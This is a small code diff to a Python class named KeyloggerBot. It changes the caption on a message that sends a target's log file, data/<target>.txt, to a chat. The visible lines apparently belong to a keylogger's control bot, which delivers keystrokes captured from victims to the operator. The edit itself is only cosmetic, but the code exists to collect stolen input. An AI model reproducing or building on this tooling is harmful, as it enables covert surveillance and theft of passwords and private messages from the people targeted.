@@ -35,7 +35,7 @@ class KeyloggerBot:
             await self.app.send_document(
                 chat_id=query.message.chat.id,
                 document=f"data/{query.data}.txt",
-                caption=f"Logs Target: {query.data}"
+                caption=f"📮 Target Logs: {query.data}"
             )
 
     def run(self):
